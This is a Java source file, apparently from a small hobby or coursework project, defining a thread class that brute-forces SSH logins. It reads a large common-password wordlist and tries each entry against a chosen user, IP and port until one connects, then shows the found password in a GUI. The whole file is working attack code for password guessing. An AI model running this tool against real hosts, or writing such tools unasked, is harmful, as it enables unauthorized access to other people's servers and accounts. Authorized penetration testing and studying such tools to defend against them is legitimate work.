package PasswordGessing;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;

public class PasswordGussingThread extends Thread {

	String IP;
	int Port;
	Login Log;
	GUIPW gui;
	String user;
	File PasswordList;
	boolean isIni = false;
	WorkThread working;
	
	
	public PasswordGussingThread() {
		PasswordList = new File("PasswordTop10Mil.txt");
	}

	public PasswordGussingThread(String IP, String Port, Login Log, GUIPW gui, String user) {
		this.IP = IP;
		this.Port = Integer.parseInt(Port);
		this.Log = Log;
		this.gui = gui;
		this.user = user;
		PasswordList = new File("PasswordTop10Mil.txt");//// https://github.com/danielmiessler/SecLists
		isIni = true;

	}

	public void setIP(String iP) {
		IP = iP;
	}

	public void setPort(String port) {
		Port = Integer.parseInt(port);
	}

	public void setLog(Login log) {
		Log = log;
	}

	public void setGui(GUIPW gui) {
		this.gui = gui;
		working = new WorkThread(gui);
	}

	public void setUser(String user) {
		this.user = user;
	}

	public void setIni() {
		isIni = true;
	}

	@SuppressWarnings("deprecation")
	@Override
	public void run() {

		try {
			boolean passFound = false;
			working.start();
			BufferedReader br = new BufferedReader(new FileReader(PasswordList));
			String correntPass;
			while ((correntPass = br.readLine()) != null) {
				if (Log.sshConnect(user, IP, correntPass, Port)) {
					passFound = true;
					working.stop();
					break;
				}
			}
			if (passFound) {
				gui.getPWtext().append("the password is " + correntPass + "\n");
			} else {
				gui.getPWtext().append("the password not found");
			}
		} catch (IOException e) {

		}
	}
}
